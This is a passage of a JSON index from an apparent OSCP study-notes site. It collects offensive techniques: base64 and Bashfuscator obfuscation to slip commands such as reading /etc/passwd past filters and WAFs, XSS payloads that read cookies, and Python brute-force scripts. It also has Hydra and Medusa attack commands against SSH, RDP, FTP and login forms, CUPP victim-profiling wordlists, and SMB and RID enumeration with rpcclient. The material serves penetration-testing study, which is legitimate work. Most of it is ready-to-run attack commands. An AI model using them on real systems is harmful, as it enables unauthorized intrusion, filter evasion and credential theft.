discuss is helpful for commands containing filtered characters or characters that may be URL-decoded by the server. This may allow for the command to get messed up by the time it reaches the shell and eventually fails to execute. Instead of copying an existing command online, we will try to create our own unique obfuscation command this time. This way, it is much less likely to be denied by a filter or a WAF. The command we create will be unique to each case, depending on what characters are allowed and the level of security on the server.\nWe can utilize various encoding tools, like base64 (for b64 encoding) or xxd (for hex encoding). Let‚Äôs take base64 as an example. First, we‚Äôll encode the payload we want to execute (which includes filtered characters):\nAdvanced Command Obfuscation\ncube111@local[/local]$ echo -n 'cat /etc/passwd | grep 33' | base64 Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw== Now we can create a command that will decode the encoded string in a sub-shell ($()), and then pass it to bash to be executed (i.e. bash\u003c\u003c\u003c), as follows:\nAdvanced Command Obfuscation\ncube111@local[/local]$ bash\u003c\u003c\u003c$(base64 -d\u003c\u003c\u003cY2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin As we can see, the above command executes the command perfectly. We did not include any filtered characters and avoided encoded characters that may lead the command to fail to execute.\nTip: Note that we are using \u003c\u003c\u003c to avoid using a pipe |, which is a filtered character.\nNow we can use this command (once we replace the spaces) to execute the same command through command injection:\nBurp POST Request Even if some commands were filtered, like bash or base64, we could bypass that filter with the techniques we discussed in the previous section (e.g., character insertion), or use other alternatives like sh for command execution and openssl for b64 decoding, or xxd for hex decoding.\nWe use the same technique with Windows as well. First, we need to base64 encode our string, as follows:\nAdvanced Command Obfuscation\nPS C:\\local\u003e [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))\rdwBoAG8AYQBtAGkA We may also achieve the same thing on Linux, but we would have to convert the string from utf-8 to utf-16 before we base64 it, as follows:\nAdvanced Command Obfuscation\ncube111@local[/local]$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64 dwBoAG8AYQBtAGkA Finally, we can decode the b64 string and execute it with a PowerShell sub-shell (iex \"$()\"), as follows:\nAdvanced Command Obfuscation\nPS C:\\local\u003e iex \"$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))\"\r21y4d As we can see, we can get creative with Bash or PowerShell and create new bypassing and obfuscation methods that have not been used before, and hence are very likely to bypass filters and WAFs. Several tools can help us automatically obfuscate our commands, which we will discuss in the next section.\nIn addition to the techniques we discussed, we can utilize numerous other methods, like wildcards, regex, output redirection, integer expansion, and many others. We can find some such techniques on PayloadsAllTheThings.\nüîê Evasion Tools for Command Injection When basic obfuscation fails against advanced security tools, automated evasion tools help. This section covers:\nBashfuscator (Linux)\nInvoke-DOSfuscation (Windows)\nüêß Linux: Bashfuscator Purpose: Obfuscate Bash commands to bypass filters.\nInstallation:\nbash\nCopyEdit\ngit clone https://github.com/Bashfuscator/Bashfuscatorcd Bashfuscatorpip3 install setuptools==65python3 setup.py install --user\nUsage:\nbash\nCopyEdit\ncd ./bashfuscator/bin/./bashfuscator -h # View help menu\nBasic Obfuscation Example:\nbash\nCopyEdit\n./bashfuscator -c 'cat /etc/passwd'\n‚ö†Ô∏è May generate very large payloads randomly using multiple techniques.\nCustomized, Short Obfuscation:\nbash\nCopyEdit\n./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1\nTest Output:\nbash\nCopyEdit\nbash -c 'eval \"$(W0=(w \\ t e c p s a \\/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s \"${W0[$Ll]}\";};)\"'\n‚úÖ Output should mimic cat /etc/passwd while appearing obfuscated.\nExercise: Test the output on your web app to check if it bypasses filters. Adjust flags if needed.\nü™ü Windows: Invoke-DOSfuscation Purpose: Obfuscate Windows CMD/PowerShell commands.\nInstallation and Launch:\npowershell\nCopyEdit\ngit clone https://github.com/danielbohannon/Invoke-DOSfuscation.gitcd Invoke-DOSfuscationImport-Module .\\Invoke-DOSfuscation.psd1Invoke-DOSfuscation\nUsage:\npowershell\nCopyEdit\nInvoke-DOSfuscation\u003e help # Show help optionsInvoke-DOSfuscation\u003e SET COMMAND type C:\\Users\\local-student\\Desktop\\flag.txtInvoke-DOSfuscation\u003e encodingInvoke-DOSfuscation\\Encoding\u003e 1 # Choose encoding technique\nGenerated Obfuscated Example:\ncmd\nCopyEdit\ntyp%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\\Users\\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\\flag.%TMP:~-13,-12%xt\nExecution on CMD:\ncmd\nCopyEdit\nC:\\local\u003e typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\\Users\\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\\flag.%TMP:~-13,-12%xt\n‚úÖ Outputs: test_flag\nNote: You can test it on Linux using pwsh. The tool is preinstalled on Pwnbox.\nFor advanced techniques, check the Secure Coding 101: JavaScript module.",
    "description": "Intro to Web Proxies Burp Suite Installing CA Certificate Another important step when using Burp Proxy/ZAP with our browser is to install the web proxy‚Äôs CA Certificates. If we don‚Äôt do this step, some HTTPS traffic may not get properly routed, or we may need to click accept every time Firefox needs to send an HTTPS request.\nWe can install Burp‚Äôs certificate once we select Burp as our proxy in Foxy Proxy, by browsing to http://burp, and download the certificate from there by clicking on CA Certificate:",
    "tags": [],
    "title": "Web Attacks",
    "uri": "/oscp-notes/web-attacks/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "XSS Testing Payloads We can test whether the page is vulnerable to XSS with the following basic XSS payload:\nCode: html\n\u003cscript\u003ealert(window.origin)\u003c/script\u003e As some modern browsers may block the alert() JavaScript function in specific locations, it may be handy to know a few other basic XSS payloads to verify the existence of XSS. One such XSS payload is \u003cplaintext\u003e, which will stop rendering the HTML code that comes after it and display it as plaintext. Another easy-to-spot payload is \u003cscript\u003eprint()\u003c/script\u003e that will pop up the browser print dialog, which is unlikely to be blocked by any browsers. Try using these payloads to see how each works. You may use the reset button to remove any current payloads.\nto read cokies\n\u003cscript\u003econsole.log(document.cookie)\u003c/script\u003e",
    "description": "XSS Testing Payloads We can test whether the page is vulnerable to XSS with the following basic XSS payload:\nCode: html\n\u003cscript\u003ealert(window.origin)\u003c/script\u003e As some modern browsers may block the alert() JavaScript function in specific locations, it may be handy to know a few other basic XSS payloads to verify the existence of XSS. One such XSS payload is \u003cplaintext\u003e, which will stop rendering the HTML code that comes after it and display it as plaintext.",
    "tags": [],
    "title": "XSS",
    "uri": "/oscp-notes/xss/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "¬†Wordlist Description Typical Use Source rockyou.txt A popular password wordlist containing millions of passwords leaked from the RockYou breach. Commonly used for password brute force attacks. RockYou breach dataset top-usernames-shortlist.txt A concise list of the most common usernames. Suitable for quick brute force username attempts. SecLists xato-net-10-million-usernames.txt A more extensive list of 10 million usernames. Used for thorough username brute forcing. SecLists 2023-200_most_used_passwords.txt A list of the 200 most commonly used passwords as of 2023. Effective for targeting commonly reused passwords. SecLists Default-Credentials/default-passwords.txt A list of default usernames and passwords commonly used in routers, software, and other devices. password brute force¬†(Post)\nimport requests ip = \"127.0.0.1\" # Change this to your instance IP address port = 1234 # Change this to your instance port number # Download a list of common passwords from the web and split it into lines passwords = requests.get(\"https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt\").text.splitlines() # Try each password from the list for password in passwords: print(f\"Attempted password: {password}\") # Send a POST request to the server with the password response = requests.post(f\"http://{ip}:{port}/dictionary\", data={'password': password}) # Check if the server responds with success and contains the 'flag' if response.ok and 'flag' in response.json(): print(f\"Correct password found: {password}\") print(f\"Flag: {response.json()['flag']}\") break GET\nimport requests ip = \"127.0.0.1\" # Change this to your instance IP address port = 1234 # Change this to your instance port number # Try every possible 4-digit PIN (from 0000 to 9999) for pin in range(10000): formatted_pin = f\"{pin:04d}\" # Convert the number to a 4-digit string (e.g., 7 becomes \"0007\") print(f\"Attempted PIN: {formatted_pin}\") # Send the request to the server response = requests.get(f\"http://{ip}:{port}/pin?pin={formatted_pin}\") # Check if the server responds with success and the flag is found if response.ok and 'flag' in response.json(): # .ok means status code is 200 (success) print(f\"Correct PIN found: {formatted_pin}\") print(f\"Flag: {response.json()['flag']}\") break Hybrid Attacks Minimum length: 8 characters Must include: At least one uppercase letter At least one lowercase letter At least one number cube111@local[/local]$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/darkweb2017_top-10000.txt Next, we need to start matching that wordlist to the password policy.\ncube111@local[/local]$ grep -E '^.{8,}$' darkweb2017-top10000.txt \u003e darkweb2017-minlength.txt [!bash!]$ grep -E '[A-Z]' darkweb2017-minlength.txt \u003e darkweb2017-uppercase.txt [!bash!]$ grep -E '[a-z]' darkweb2017-minlength.txt \u003e darkweb2017-uppercase.txt [!bash!]$ grep -E '[0-9]' darkweb2017-lowercase.txt \u003e darkweb2017-number.txt Hydra\nParameter Explanation Usage Example -l LOGIN or -L FILE Login options: Specify either a single username (-l) or a file containing a list of usernames (-L). hydra -l admin ... or hydra -L usernames.txt ... -p PASS or -P FILE Password options: Provide either a single password (-p) or a file containing a list of passwords (-P). hydra -p password123 ... or hydra -P passwords.txt ... -t TASKS Tasks: Define the number of parallel tasks (threads) to run, potentially speeding up the attack. hydra -t 4 ... -f Fast mode: Stop the attack after the first successful login is found. hydra -f ... -s PORT Port: Specify a non-default port for the target service. hydra -s 2222 ... -v or -V Verbose output: Display detailed information about the attack‚Äôs progress, including attempts and results. hydra -v ... or hydra -V ... (for even more verbosity) service://server Target: Specify the service (e.g., ssh, http, ftp) and the target server‚Äôs address or hostname. hydra ssh://192.168.1.100 /OPT Service-specific options: Provide any additional options required by the target service. hydra http-get://example.com/login.php -m \"POST:user=^USER^\u0026pass=^PASS^\" (for HTTP form-based authentication) Brute-Forcing HTTP Authentication Imagine you're tasked with testing the security of a website using basic HTTP authentication at www.example.com. You have a list of potential usernames stored in usernames.txt and corresponding passwords in passwords.txt. To launch a brute-force attack against this HTTP service, use the following Hydra command:\nHydra\ncube111@local[/local]$ hydra -L usernames.txt -P passwords.txt www.example.com http-get Targeting Multiple SSH Servers Consider a situation where you have identified several servers that may be vulnerable to SSH brute-force attacks. You compile their IP addresses into a file named targets.txt and know that these servers might use the default username ‚Äúroot‚Äù and password ‚Äútoor.‚Äù To efficiently test all these servers simultaneously, use the following Hydra command:\nHydra\ncube111@local[/local]$ hydra -l root -p toor -M targets.txt ssh Testing FTP Credentials on a Non-Standard Port Imagine you need to assess the security of an FTP server hosted at ftp.example.com, which operates on a non-standard port 2121. You have lists of potential usernames and passwords stored in usernames.txt and passwords.txt, respectively. To test these credentials against the FTP service, use the following Hydra command:\nHydra\ncube111@local[/local]$ hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp Brute-Forcing a Web Login Form Suppose you are tasked with brute-forcing a login form on a web application at www.example.com. You know the username is ‚Äúadmin,‚Äù and the form parameters for the login are user=^USER^\u0026pass=^PASS^. To perform this attack, use the following Hydra command:\ncube111@local[/local]$ hydra -l admin -P passwords.txt www.example.com http-post-form \"/login:user=^USER^\u0026pass=^PASS^:S=302\" Advanced RDP Brute-Forcing Now, imagine you're testing a Remote Desktop Protocol (RDP) service on a server with IP 192.168.1.100. You suspect the username is ‚Äúadministrator,‚Äù and that the password consists of 6 to 8 characters, including lowercase letters, uppercase letters, and numbers. To carry out this precise attack, use the following Hydra command:\nHydra\ncube111@local[/local]$ hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp Basic HTTP Authentication # Download wordlist if needed cube111@local[/local]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt # Hydra command cube111@local[/local]$ hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81 ... Hydra v9.5 (c) 2023 by van Hauser/THC \u0026 David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-09 16:04:31 [DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200), ~13 tries per task [DATA] attacking http-get://127.0.0.1:81/ [81][http-get] host: 127.0.0.1 login: basic-auth-user password: ... 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-09 16:04:32 -l basic-auth-user: This specifies that the username for the login attempt is ‚Äòbasic-auth-user‚Äô. -P 2023-200_most_used_passwords.txt: This indicates that Hydra should use the password list contained in the file ‚Äò2023-200_most_used_passwords.txt‚Äô for its brute-force attack. 127.0.0.1: This is the target IP address, in this case, the local machine (localhost). http-get /: This tells Hydra that the target service is an HTTP server and the attack should be performed using HTTP GET requests to the root path (‚Äô/‚Äô). -s 81: This overrides the default port for the HTTP service and sets it to 81. A Basic Login Form Example Most login forms follow a similar structure. Here's an example:\nCode: html\n\u003cform action=\"/login\" method=\"post\"\u003e \u003clabel for=\"username\"\u003eUsername:\u003c/label\u003e \u003cinput type=\"text\" id=\"username\" name=\"username\"\u003e\u003cbr\u003e\u003cbr\u003e \u003clabel for=\"password\"\u003ePassword:\u003c/label\u003e \u003cinput type=\"password\" id=\"password\" name=\"password\"\u003e\u003cbr\u003e\u003cbr\u003e \u003cinput type=\"submit\" value=\"Submit\"\u003e \u003c/form\u003e Login Forms A Basic Login Form Example Most login forms follow a similar structure. Here's an example:\nCode: html\n\u003cform action=\"/login\" method=\"post\"\u003e \u003clabel for=\"username\"\u003eUsername:\u003c/label\u003e \u003cinput type=\"text\" id=\"username\" name=\"username\"\u003e\u003cbr\u003e\u003cbr\u003e \u003clabel for=\"password\"\u003ePassword:\u003c/label\u003e \u003cinput type=\"password\" id=\"password\" name=\"password\"\u003e\u003cbr\u003e\u003cbr\u003e \u003cinput type=\"submit\" value=\"Submit\"\u003e \u003c/form\u003e This form, when submitted, sends a POST request to the /login endpoint on the server, including the entered username and password as form data.\nCode: http\nPOST /login HTTP/1.1 Host: www.example.com Content-Type: application/x-www-form-urlencoded Content-Length: 29 username=john\u0026password=secret123 The POST method indicates that data is being sent to the server to create or update a resource. /login is the URL endpoint handling the login request. The Content-Type header specifies how the data is encoded in the request body. The Content-Length header indicates the size of the data being sent. The request body contains the username and password, encoded as key-value pairs. When a user interacts with a login form, their browser handles the initial processing. The browser captures the entered credentials, often employing JavaScript for client-side validation or input sanitization. Upon submission, the browser constructs an HTTP POST request. This request encapsulates the form data‚Äîincluding the username and password‚Äîwithin its body, often encoded as application/x-www-form-urlencoded or multipart/form-data.\ncube111@local[/local]$ hydra [options] target http-post-form \"path:params:condition_string\" hydra ... http-post-form \"/login:user=^USER^\u0026pass=^PASS^:F=Invalid credentials\" hydra ... http-post-form \"/login:user=^USER^\u0026pass=^PASS^:S=302\" hydra ... http-post-form \"/login:user=^USER^\u0026pass=^PASS^:S=Dashboard\" Manual Inspection Upon accessing the IP:PORT in your browser, a basic login form is presented. Using your browser's developer tools (typically by right-clicking and selecting ‚ÄúInspect‚Äù or a similar option), you can view the underlying HTML code for this form. Let's break down its key components:\nCode: html\n\u003cform method=\"POST\"\u003e \u003ch2\u003eLogin\u003c/h2\u003e \u003clabel for=\"username\"\u003eUsername:\u003c/label\u003e \u003cinput type=\"text\" id=\"username\" name=\"username\"\u003e \u003clabel for=\"password\"\u003ePassword:\u003c/label\u003e \u003cinput type=\"password\" id=\"password\" name=\"password\"\u003e \u003cinput type=\"sub The HTML reveals a simple login form. Key points for Hydra:\nMethod: POST - Hydra will need to send POST requests to the server. Fields: Username: The input field named username will be targeted. Password: The input field named password will be targeted. Login Forms\n# Download wordlists if needed cube111@local[/local]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt cube111@local[/local]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt # Hydra command cube111@local[/local]$ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form \"/:username=^USER^\u0026password=^PASS^:F=Invalid credentials\" Hydra v9.5 (c) 2023 by van Hauser/THC \u0026 David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-05 12:51:14 [DATA] max 16 tasks per 1 server, overall 16 tasks, 3400 login tries (l:17/p:200), ~213 tries per task [DATA] attacking http-post-form://IP:PORT/:username=^USER^\u0026password=^PASS^:F=Invalid credentials [5000][http-post-form] host: IP login: ... password: ... [STATUS] attack finished for IP (valid pair found) 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-05 12:51:28 Medusa Command Syntax and Parameter Table Medusa's command-line interface is straightforward. It allows users to specify hosts, users, passwords, and modules with various options to fine-tune the attack process.\nMedusa\ncube111@local[/local]$ medusa [target_options] [credential_options] -M module [module_options] Parameter Explanation Usage Example -h HOST or -H FILE Target options: Specify either a single target hostname or IP address (-h) or a file containing a list of targets (-H). medusa -h 192.168.1.10 ... or medusa -H targets.txt ... -u USERNAME or -U FILE Username options: Provide either a single username (-u) or a file containing a list of usernames (-U). medusa -u admin ... or medusa -U usernames.txt ... -p PASSWORD or -P FILE Password options: Specify either a single password (-p) or a file containing a list of passwords (-P). medusa -p password123 ... or medusa -P passwords.txt ... -M MODULE Module: Define the specific module to use for the attack (e.g., ssh, ftp, http). medusa -M ssh ... -m \"MODULE_OPTION\" Module options: Provide additional parameters required by the chosen module, enclosed in quotes. medusa -M http -m \"POST /login.php HTTP/1.1\\r\\nContent-Length: 30\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n\\r\\nusername=^USER^\u0026password=^PASS^\" ... -t TASKS Tasks: Define the number of parallel login attempts to run, potentially speeding up the attack. medusa -t 4 ... -f or -F Fast mode: Stop the attack after the first successful login is found, either on the current host (-f) or any host (-F). medusa -f ... or medusa -F ... -n PORT Port: Specify a non-default port for the target service. medusa -n 2222 ... -v LEVEL Verbose output: Display detailed information about the attack‚Äôs progress. The higher the LEVEL (up to 6), the more verbose the output. medusa -v 4 ... Medusa Modules Each module in Medusa is tailored to interact with specific authentication mechanisms, allowing it to send the appropriate requests and interpret responses for successful attacks. Below is a table of commonly used modules:\nMedusa Module Service/Protocol Description Usage Example FTP File Transfer Protocol Brute-forcing FTP login credentials, used for file transfers over a network. medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt HTTP Hypertext Transfer Protocol Brute-forcing login forms on web applications over HTTP (GET/POST). medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^\u0026password=^PASS^ IMAP Internet Message Access Protocol Brute-forcing IMAP logins, often used to access email servers. medusa -M imap -h mail.example.com -U users.txt -P passwords.txt MySQL MySQL Database Brute-forcing MySQL database credentials, commonly used for web applications and databases. medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt POP3 Post Office Protocol 3 Brute-forcing POP3 logins, typically used to retrieve emails from a mail server. medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt RDP Remote Desktop Protocol Brute-forcing RDP logins, commonly used for remote desktop access to Windows systems. medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt SSHv2 Secure Shell (SSH) Brute-forcing SSH logins, commonly used for secure remote access. medusa -M ssh -h 192.168.1.100 -u root -P passwords.txt Subversion (SVN) Version Control System Brute-forcing Subversion (SVN) repositories for version control. medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt Telnet Telnet Protocol Brute-forcing Telnet services for remote command execution on older systems. medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt VNC Virtual Network Computing Brute-forcing VNC login credentials for remote desktop access. medusa -M vnc -h 192.168.1.100 -P passwords.txt Web Form Brute-forcing Web Login Forms Brute-forcing login forms on websites using HTTP POST requests. medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:\"username=^USER^\u0026password=^PASS^:F=Invalid\" cube111@local[/local]$ medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh Targeting Multiple Web Servers with Basic HTTP Authentication Suppose you have a list of web servers that use basic HTTP authentication. These servers' addresses are stored in web_servers.txt, and you also have lists of common usernames and passwords in usernames.txt and passwords.txt, respectively. To test these servers concurrently, execute:\nMedusa\ncube111@local[/local]$ medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET Testing for Empty or Default Passwords If you want to assess whether any accounts on a specific host (10.0.0.5) have empty or default passwords (where the password matches the username), you can use:\nMedusa\ncube111@local[/local]$ medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name This command instructs Medusa to:\nTarget the host at 10.0.0.5. Use the usernames from usernames.txt. Perform additional checks for empty passwords (-e n) and passwords matching the username (-e s). Use the appropriate service module (replace service_name with the correct module name). Medusa will try each username with an empty password and then with the password matching the username, potentially revealing accounts with weak or default configurations.\nSSH\ncube111@local[/local]$ medusa -h IP -n PORT -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3 Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks \u003cjmk@foofus.net\u003e ... ACCOUNT FOUND: [ssh] Host: IP User: sshuser Password: 1q2w3e4r5t [SUCCESS] FTP\ncube111@local[/local]$ medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5 Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks \u003cjmk@foofus.net\u003e GENERAL: Parallel Hosts: 1 Parallel Logins: 5 GENERAL: Total Hosts: 1 GENERAL: Total Users: 1 GENERAL: Total Passwords: 197 ... ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ... Password: ... [SUCCESS] ... GENERAL: Medusa has finished. Custom Wordlists Username Anarchy cube111@local[/local]$ ./username-anarchy Jane Smith \u003e jane_smith_usernames.txt CUPP Field Details Name Jane Smith Nickname Janey Birthdate December 11, 1990 Relationship Status In a relationship with Jim Partner's Name Jim (Nickname: Jimbo) Partner's Birthdate December 12, 1990 Pet Spot Company AHI Interests Hackers, Pizza, Golf, Horses Favorite Colors Blue Minimum Length: 6 characters Must Include: At least one uppercase letter At least one lowercase letter At least one number At least two special characters (from the set !@#$%^\u0026*) cube111@local[/local]$ cupp -i ___________ cupp.py! # Common \\ # User \\ ,__, # Passwords \\ (oo)____ # Profiler (__) ) ||--|| * [ Muris Kurgas | j0rgan@remote-exploit.org ] [ Mebus | https://github.com/Mebus/] [+] Insert the information about the victim to make a dictionary [+] If you don\\'t know all the info, just hit enter when asked! ;) \u003e First Name: Jane \u003e Surname: Smith \u003e Nickname: Janey \u003e Birthdate (DDMMYYYY): 11121990 \u003e Partners) name: Jim \u003e Partners) nickname: Jimbo \u003e Partners) birthdate (DDMMYYYY): 12121990 \u003e Child\\'s name: \u003e Child\\'s nickname: \u003e Child\\'s birthdate (DDMMYYYY): \u003e Pet\\'s name: Spot \u003e Company name: AHI \u003e Do you want to add some key words about the victim? Y/[N]: y \u003e Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: hacker,blue \u003e Do you want to add special chars at the end of words? Y/[N]: y \u003e Do you want to add some random numbers at the end of words? Y/[N]:y \u003e Leet mode? (i.e. leet = 1337) Y/[N]: y [+] Now making a dictionary... [+] Sorting list and removing duplicates... [+] Saving dictionary to jane.txt, counting 46790 words. [+] Now load your pistolero with jane.txt and shoot! Good luck! cube111@local[/local]$ grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^\u0026*].*){2,}' \u003e jane-filtered.txt cube111@local[/local]$ hydra -L usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form \"/:username=^USER^\u0026password=^PASS^:Invalid credentials\" Hydra v9.5 (c) 2023 by van Hauser/THC \u0026 David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these * ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-05 11:47:14 [DATA] max 16 tasks per 1 server, overall 16 tasks, 655060 login tries (l:14/p:46790), ~40942 tries per task [DATA] attacking http-post-form://IP:PORT/:username=^USER^\u0026password=^PASS^:Invalid credentials [PORT][http-post-form] host: IP login: ... password: ... [STATUS] attack finished for IP (valid pair found) 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-05 11:47:18",
    "description": "Wordlist Description Typical Use Source rockyou.txt A popular password wordlist containing millions of passwords leaked from the RockYou breach. Commonly used for password brute force attacks. RockYou breach dataset top-usernames-shortlist.txt A concise list of the most common usernames. Suitable for quick brute force username attempts. SecLists xato-net-10-million-usernames.txt A more extensive list of 10 million usernames. Used for thorough username brute forcing. SecLists 2023-200_most_used_passwords.txt A list of the 200 most commonly used passwords as of 2023.",
    "tags": [],
    "title": "login brute force wordlists",
    "uri": "/oscp-notes/login-brute-force-wordlists/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "crackmapexec smb 10.129.14.128 --shares -u '' -p ''",
    "description": "crackmapexec smb 10.129.14.128 --shares -u '' -p ''",
    "tags": [],
    "title": "crackmapexec",
    "uri": "/oscp-notes/crackmapexec/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "./enum4linux-ng.py 10.129.14.128 -A cube111@local[/local]$ ./enum4linux-ng.py 10.10.11.45 -A -C enum4linux -u \u003cusername\u003e -p \u003cpassword\u003e -d \u003cdomain\u003e \u003ctarget_ip\u003e",
    "description": "./enum4linux-ng.py 10.129.14.128 -A cube111@local[/local]$ ./enum4linux-ng.py 10.10.11.45 -A -C enum4linux -u \u003cusername\u003e -p \u003cpassword\u003e -d \u003cdomain\u003e \u003ctarget_ip\u003e",
    "tags": [],
    "title": "eum4linux",
    "uri": "/oscp-notes/eum4linux/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "Query Description srvinfo Server information. enumdomains Enumerate all domains that are deployed in the network. querydominfo Provides domain, server, and user information of deployed domains. netshareenumall Enumerates all available shares. netsharegetinfo \u003cshare\u003e Provides information about a specific share. enumdomusers Enumerates all domain users. queryuser \u003cRID\u003e Provides information about a specific user. cube111@local[/local]$ rpcclient -U'%' 10.10.110.17 rpcclient $\u003e srvinfo DEVSMB Wk Sv PrQ Unx NT SNT DEVSM platform_id : 500 os version : 6.1 server type : 0x809a03 rpcclient $\u003e enumdomains name:[DEVSMB] idx:[0x0] name:[Builtin] idx:[0x1] rpcclient $\u003e querydominfo Domain: DEVOPS Server: DEVSMB Comment: DEVSM Total Users: 2 Total Groups: 0 Total Aliases: 0 Sequence No: 1632361158 Force Logoff: -1 Domain Server State: 0x1 Server Role: ROLE_DOMAIN_PDC Unknown 3: 0x1 rpcclient $\u003e netshareenumall netname: print$ remark: Printer Drivers path: C:\\var\\lib\\samba\\printers password: netname: home remark: INFREIGHT Samba path: C:\\home\\ password: netname: dev remark: DEVenv path: C:\\home\\sambauser\\dev\\ password: netname: notes remark: CheckIT path: C:\\mnt\\notes\\ password: netname: IPC$ remark: IPC Service (DEVSM) path: C:\\tmp password: rpcclient $\u003e netsharegetinfo notes netname: notes remark: CheckIT path: C:\\mnt\\notes\\ password: type: 0x0 perms: 0 max_uses: -1 num_uses: 1 revision: 1 type: 0x8004: SEC_DESC_DACL_PRESENT SEC_DESC_SELF_RELATIVE DACL ACL Num ACEs: 1 revision: 2 --- ACE type: ACCESS ALLOWED (0) flags: 0x00 Specific bits: 0x1ff Permissions: 0x101f01ff: Generic all access SYNCHRONIZE_ACCESS WRITE_OWNER_ACCESS WRITE_DAC_ACCESS READ_CONTROL_ACCESS DELETE_ACCESS SID: S-1-1-0 rpcclient $\u003e enumdomusers rpcclient $\u003e queryuser 0x3e9 rpcclient $\u003e queryuser 0x3e8 RID bruteforce\ncube111@local[/local]$ for i in $(seq 500 1100);do rpcclient -N -U \"\" 10.129.14.128 -c \"queryuser 0x$(printf '%x\\n' $i)\" | grep \"User Name\\|user_rid\\|group_rid\" \u0026\u0026 echo \"\";done User Name : sambauser user_rid : 0x1f5 group_rid: 0x201 User Name : mrb3n user_rid : 0x3e8 group_rid: 0x201 User Name : cry0l1t3 user_rid : 0x3e9 group_rid: 0x201 samrdump.py 10.129.14.128 So to change the password you can use the following command\nrpcclient \u003cip\u003e -U ‚Äòuser%pass‚Äô -c ‚Äúsetuserinfo2 \u003cRID\u003e \u003clevel\u003e \u003cnewpass\u003e‚Äù",
    "description": "Query Description srvinfo Server information. enumdomains Enumerate all domains that are deployed in the network. querydominfo Provides domain, server, and user information of deployed domains. netshareenumall Enumerates all available shares. netsharegetinfo \u003cshare\u003e Provides information about a specific share. enumdomusers Enumerates all domain users. queryuser \u003cRID\u003e Provides information about a specific user. cube111@local[/local]$ rpcclient -U'%' 10.10.110.17 rpcclient $\u003e srvinfo DEVSMB Wk Sv PrQ Unx NT SNT DEVSM platform_id : 500 os version : 6.",
    "tags": [],
    "title": "rpcclient",
    "uri": "/oscp-notes/rpcclient/index.html"
  },
  {
